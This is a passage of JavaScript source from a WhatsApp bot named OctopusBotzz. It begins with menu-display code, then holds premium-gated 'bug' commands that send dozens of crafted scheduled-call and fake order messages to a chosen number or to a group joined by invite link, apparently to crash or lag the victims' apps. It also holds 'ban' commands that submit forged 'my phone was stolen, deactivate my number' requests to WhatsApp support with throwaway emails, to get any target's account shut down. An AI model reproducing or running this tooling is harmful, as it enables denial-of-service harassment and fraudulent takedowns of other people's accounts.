                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "databasemenu":
        {
          let msg = `Hi ${pushname}\n\n${databasemenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "aimenu":
        {
          let msg = `Hi ${pushname}\n\n${aimenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "bugmenu":
        {
          let msg = `Hi ${pushname}\n\n${bugmenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      //bug && war cases
      //⚠️do not edit cases otherwise bug not work
      //bug cases
      case "amountbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return relygcxeon(
              `Use ${prefix + command} amount\nExample ${prefix + command} 5`
            );
          amount = `${encodeURI(text)}`;
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = `${xeontext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              from,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
        }
        replyLinkGc(
          `*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`
        );
        break;
      case "pmbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 6281359391296`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = `${xeontext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
        }
        replyLinkGc(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "delaybug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 6281359391296`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext2;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
        }
        replyLinkGc(
          `*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "docubug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 6281359391296`
            );
          await loading();
          if (args.length < 1)
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 6281359391296`
            );
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "15";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = `${xeontext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
        }
        replyLinkGc(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "unlimitedbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 6281359391296`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext3;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
        }
        replyLinkGc(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "bombug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 6281359391296`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext4;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
        }
        replyLinkGc(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "lagbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 6281359391296`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext2;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
        }
        replyLinkGc(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "trollybug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 6281359391296`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "15";
          for (let i = 0; i < amount; i++) {
            var order = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                orderMessage: {
                  orderId: "599519108102353",
                  thumbnail: thumb,
                  itemCount: 1999,
                  status: "INQUIRY",
                  surface: "CATALOG",
                  message: `${botname}`,
                  orderTitle: " TROLLY BUG ",
                  sellerJid: "6281359391296@s.whatsapp.net",
                  token: "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(victim, order.message, {
              messageId: order.key.id,
            });
          }
          replyLinkGc(
            `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
          );
        }
        break;
      case "gcbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let gcSendBug = await OctopusBotzz.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = `${xeontext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              gcSendBug,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
          replyLinkGc(
            `*Successfully sent Bug To ${gcSendBug} Please pause for 3 minutes*`
          );
        }
        break;
      case "delaygcbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let gcSendBug = await OctopusBotzz.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext5;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              gcSendBug,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
          replyLinkGc(
            `*Successfully sent Bug To ${gcSendBug} Please pause for 3 minutes*`
          );
        }
        break;
      case "laggcbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let gcSendBug = await OctopusBotzz.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext2;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              gcSendBug,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
          replyLinkGc(
            `*Successfully sent Bug To ${gcSendBug} Please pause for 3 minutes*`
          );
        }
        break;
      case "bomgcbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let gcSendBug = await haikal.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext4;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              gcSendBug,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
          replyLinkGc(
            `*Successfully sent Bug To ${gcSendBug} Please pause for 3 minutes*`
          );
        }
        break;
      case "unlimitedgcbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let gcSendBug = await OctopusBotzz.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = xeontext3;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              gcSendBug,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
          replyLinkGc(
            `*Successfully sent Bug To ${gcSendBug} Please pause for 3 minutes*`
          );
        }
        break;
      case "trollygcbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let gcSendBug = await OctopusBotzz.groupAcceptInvite(result);
          amount = "15";
          for (let i = 0; i < amount; i++) {
            var order = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                orderMessage: {
                  orderId: "599519108102353",
                  thumbnail: thumb,
                  itemCount: 1999,
                  status: "INQUIRY",
                  surface: "CATALOG",
                  message: `${botname}`,
                  orderTitle: " TROLLY BUG ",
                  sellerJid: "6281359391296@s.whatsapp.net",
                  token: "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(gcSendBug, order.message, {
              messageId: order.key.id,
            });
          }
          replyLinkGc(
            `*Successfully sent Bug To ${gcSendBug} Please pause for 3 minutes*`
          );
        }
        break;
      case "docugcbug":
        {
          if (!isPremium) return replyLinkGc(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let gcSendBug = await OctopusBotzz.groupAcceptInvite(result);
          amount = "15";
          for (let i = 0; i < amount; i++) {
            const xeonybug1 = `${xeontext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Jakarta")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: xeonybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            OctopusBotzz.relayMessage(
              gcSendBug,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
          }
          replyLinkGc(
            `*Successfully sent Bug To ${gcSendBug} Please pause for 3 minutes*`
          );
        }
        break;

      //ban/unban cases
      case "out":
      case "verif":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append("your_message", "Perdido/roubado: desative minha conta");
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv1":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
